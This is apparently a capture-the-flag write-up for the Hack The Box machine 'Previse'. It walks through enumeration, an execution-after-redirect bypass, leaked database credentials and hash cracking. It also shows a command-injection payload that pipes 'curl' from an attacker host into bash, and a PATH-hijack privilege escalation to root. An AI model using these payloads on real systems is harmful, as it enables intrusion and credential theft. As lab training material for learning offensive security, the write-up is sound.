# Enumeration

Starting with nmap
```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-08 00:32 IST
Nmap scan report for 10.129.154.57
Host is up (0.27s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.86 seconds
```
Looking at results, we have port 80 and 22 open.

## Port 80

![image](https://user-images.githubusercontent.com/43528306/128631381-323e709c-f1a3-47c7-8620-fefb4b5a8be7.png)

Site seems related to file storage. Trying some common username and passwords, but didn't work. Running ffuf for brute forcing directories, we found
```bash
 ffuf -u http://10.10.11.104/FUZZ -w /usr/share/wordlists/dirb/common.txt -c -e .php 
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.104/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,302
________________________________________________

                        [Status: 302, Size: 2801, Words: 737, Lines: 72]
accounts.php            [Status: 302, Size: 3994, Words: 1096, Lines: 94]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
download.php            [Status: 302, Size: 0, Words: 1, Lines: 1]
favicon.ico             [Status: 200, Size: 15406, Words: 15, Lines: 10]
files.php               [Status: 302, Size: 6068, Words: 1995, Lines: 131]
footer.php              [Status: 200, Size: 217, Words: 10, Lines: 6]
header.php              [Status: 200, Size: 980, Words: 183, Lines: 21]
index.php               [Status: 302, Size: 2801, Words: 737, Lines: 72]
index.php               [Status: 302, Size: 2801, Words: 737, Lines: 72]
login.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1]
logs.php                [Status: 302, Size: 0, Words: 1, Lines: 1]
nav.php                 [Status: 200, Size: 1248, Words: 462, Lines: 32]
status.php              [Status: 302, Size: 2971, Words: 749, Lines: 75]
```
Most of the pages gives 302 status code. We found `nav.php` with status code 200, means its not redirecting to other pages. Navigating to it
![image](https://user-images.githubusercontent.com/43528306/128631516-4abbaa83-1280-49df-be38-ad5a998941c3.png)

The page has a option to create an account, but `/account.php` was redirecting to `login.php`. Looking at response from each page using burp, 
we found that on pages which gave 302 redirect were having the wole page in the respones. This vulnerability is known as [Execution After redirect](https://owasp.org/www-community/attacks/Execution_After_Redirect_(EAR))

Here, we can skip the redirects by changing the status code from *302 Found* to *200 OK*. Using this knowledge, we can create a account on the site. We just need to follow these steps:
- Click on create account, Intercept the request
- Intercept the response from server
- Change status code from 302 to 200 OK

We now have a full working registration page, which allows us to create new account using which we can login to site.

![image](https://user-images.githubusercontent.com/94787830/148672286-b0333de8-445d-48e0-bbae-07020d4c5fa6.png)

On the *files* page, we found a zip file named `siteBackup.zip` which we can download. The zip archive contained the source code of the website.

![image](https://user-images.githubusercontent.com/94787830/148672321-0179b06c-b880-4734-b105-9999678a271d.png)

Looking at `config.php`, we found credentials for mysql.
```php
function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}
```
We have the credentials, but mysql port was not open. We could try using this password and user `m4lwhere` (found on website footer),to login. But no success.

### Command Injection

Looking at other files, the `logs.php` file was interesting. The page allow us to download log files from server with our choice of delemiter.
But the backend code was not sanitizing  *delim* parameter, and using it directly in PHP `exec()` function which makes it vulnerable to Command Injection.
```php
$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;
```
Fuzzing this endpoint, we found that web app was vulnerable to blind command injection. 
Using `delim=comma;curl 10.10.14.64:8000/test.sh|bash` as delimeter, we were able to get shell on the box.

## Shell as www-data
Looking at running services, we found that MySQL was running. Using the previously found credentials from `config.php`, we can connect to MySQL.
```bash
$ mysql -u root -p
Enter password: 

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| previse            |
| sys                |
+--------------------+
5 rows in set (0.00 sec)
mysql> use previse;
mysql> show tables;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+
2 rows in set (0.00 sec)
```
The table contained hash for user `m4lwhere`
```
m4lwhere: $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
```
We can crack the hash either by using *Hashcat* or *John the Ripper*.

```bash
hashcat -m 500 hash /usr/share/wordlists/rockyou.txt

$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
                                                  
Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
Hash.Target......: $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
Time.Started.....: Sun Aug  8 16:48:10 2021 (19 mins, 13 secs)
Time.Estimated...: Sun Aug  8 17:07:23 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     5293 H/s (11.51ms) @ Accel:32 Loops:500 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 7413376/14344385 (51.68%)
Rejected.........: 0/7413376 (0.00%)
Restore.Point....: 7413248/14344385 (51.68%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:500-1000
Candidates.#1....: ilovecody98 -> ilovecloandlivey
```
We can ssh into the box using the credentials.

## ROOT
Checking sudo permissions
```bash
m4lwhere@previse:~$ sudo -l                                                         
[sudo] password for m4lwhere:                                                       
User m4lwhere may run the following commands on previse:                            
    (root) /opt/scripts/access_backup.sh
```
Looking at the script
```bash
m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh 
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

The script was used to make backup, but it was using `gzip` without complete path which makes it vulnerable to *PATH Injection*. 

### Exploiting PATH Injection
To exploit it, Lets create a malicious script in `tmp` folder.
Script will be used to set suid bit on bash. After which, add `/tmp` to our path, and executing the script
```bash
m4lwhere@previse:/tmp$ cat gzip 
chmod +xs /bin/bash
m4lwhere@previse:/tmp$ chmod +x gzip 
m4lwhere@previse: PATH=.:$PATH
m4lwhere@previse:/tmp$ sudo /opt/scripts/access_backup.sh 
m4lwhere@previse:/tmp$ ls -al /bin/bash 
-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash

m4lwhere@previse:/tmp$ bash -p

bash-4.4# whoami
root
```
